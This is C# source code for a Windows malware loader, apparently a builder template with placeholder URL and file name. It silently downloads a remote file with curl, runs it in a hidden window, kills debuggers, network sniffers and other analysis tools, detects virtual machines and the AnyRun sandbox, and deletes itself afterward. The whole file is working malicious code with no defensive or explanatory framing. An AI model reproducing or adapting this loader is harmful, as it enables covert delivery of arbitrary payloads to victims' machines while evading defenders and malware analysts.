using System;
using System.IO;
using System.Diagnostics;

namespace SimplyProgram
{
    internal class Program
    {
        static void Main(string[] args)
        {
            CallbackDtc();
            AntiDbg();

            string remoteUrl = "KINGURL";
            string tempFilePath = Path.Combine(Path.GetTempPath(), "KING_PROGRAM_NAME");

            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "curl",
                    Arguments = $"-o \"{tempFilePath}\" \"{remoteUrl}\"",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                Process.Start(psi)?.WaitForExit();

                psi = new ProcessStartInfo
                {
                    FileName = tempFilePath,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                Process.Start(psi);
                AutoSelfDel();
            }
            catch
            {
                AutoSelfDel();
            }
        }

        private static void CallbackDtc()
        {
            if (AntiVM_Checker())
            {
                AutoSelfDel();
            }

            if (AnyRunDtc())
            {
                AutoSelfDel();
            }
        }

        public static bool AntiDbg() // Check Forbidden processes to kill
        {
            string[] forbiddenProcesses = {
                "dnspy", "Mega Dumper", "Dumper", "PE-bear", "de4dot", "TCPView", "Resource Hacker", "Pestudio", "HxD", "Scylla",
                "de4dot", "PE-bear", "Fakenet-NG", "ProcessExplorer", "SoftICE", "ILSpy", "dump", "proxy", "de4dotmodded", "StringDecryptor",
                "Centos", "SAE", "monitor", "brute", "checker", "zed", "sniffer", "http", "debugger", "james",
                "exeinfope", "codecracker", "x32dbg", "x64dbg", "ollydbg", "ida -", "charles", "dnspy", "simpleassembly", "peek",
                "httpanalyzer", "httpdebug", "fiddler", "wireshark", "dbx", "mdbg", "gdb", "windbg", "dbgclr", "kdb",
                "kgdb", "mdb", "ollydbg", "dumper", "wireshark", "httpdebugger", "http debugger", "fiddler", "decompiler", "unpacker",
                "deobfuscator", "de4dot", "confuser", " /snd", "x64dbg", "x32dbg", "x96dbg", "process hacker", "dotpeek", ".net reflector",
                "ilspy", "file monitoring", "file monitor", "files monitor", "netsharemonitor", "fileactivitywatcher", "fileactivitywatch", "windows explorer tracker", "process monitor", "disk pluse",
                "file activity monitor", "fileactivitymonitor", "file access monitor", "mtail", "snaketail", "tail -n", "httpnetworksniffer", "microsoft message analyzer", "networkmonitor", "network monitor",
                "soap monitor", "ProcessHacker", "internet traffic agent", "socketsniff", "networkminer", "network debugger", "HTTPDebuggerUI", "mitmproxy", "python", "mitm", "Wireshark","UninstallTool", "UninstallToolHelper", "ProcessHacker",
            };
            var processes = Process.GetProcesses();

            foreach (var processName in forbiddenProcesses)
            {
                foreach (var process in processes)
                {
                    if (process.ProcessName.ToLower() == processName.ToLower())
                    {
                        try
                        {
                            process.Kill();
                            process.Dispose();
                        }
                        catch { }


                        return true;
                    }
                }
            }
            return false;
        } // End function

        private static bool AnyRunDtc() // Check AnyRun
        {
            string[] array = { "Acrobat Reader DC.lnk", "CCleaner.lnk", "FileZilla Client.lnk", "Firefox.lnk", "Google Chrome.lnk", "Skype.lnk", "Microsoft Edge.lnk" };

            foreach (string fileName in array)
            {
                if (!File.Exists(Path.Combine(Environment.ExpandEnvironmentVariables("%systemdrive%"), "Users", "Public", "Desktop", fileName)))
                {
                    return false;
                }
            }

            if (string.Equals(Environment.UserName.ToLower(), "admin", StringComparison.OrdinalIgnoreCase) && Environment.MachineName.Contains("USER-PC"))
            {
                return true;
            }

            return false;
        } // End function

        private static bool AntiVM_Checker() // Check Virtual Machine
        {
            string[] vmProcesses = {
        "vmtoolsd", "vmwaretray", "vmwareuser", "vgauthservice", "vmacthlp",
        "vmsrvc", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol",
        "ksdumperclient", "ksdumper", "joeboxserver", "vmwareservice", "vmwaretray", "VBoxService",
        "VBoxTray",
    };

            var processes = Process.GetProcesses();

            foreach (var process in processes)
            {
                foreach (var processName in vmProcesses)
                {
                    if (process.ProcessName.ToLower() == processName.ToLower())
                    {
                        return true;
                    }
                }
            }
            return false;
        } // End Function

        private static void AutoSelfDel() // AutoSelf Delete child-function
        {
            var fileName = Process.GetCurrentProcess().MainModule.FileName;
            selfRemove(fileName, 1);
            Environment.Exit(0);
        }

        private static void selfRemove(string fileName, int delaySecond = 2) // Main selfRemove
        {
            fileName = Path.GetFullPath(fileName);
            var folder = Path.GetDirectoryName(fileName);
            var currentProcessFileName = Path.GetFileName(fileName);

            var arguments = $"/c timeout /t {delaySecond} && DEL /f {currentProcessFileName} ";

            var processStartInfo = new ProcessStartInfo()
            {
                FileName = "cmd",
                UseShellExecute = false,
                CreateNoWindow = true,
                Arguments = arguments,
                WorkingDirectory = folder,
            };
            Process.Start(processStartInfo);
        }
    }
}
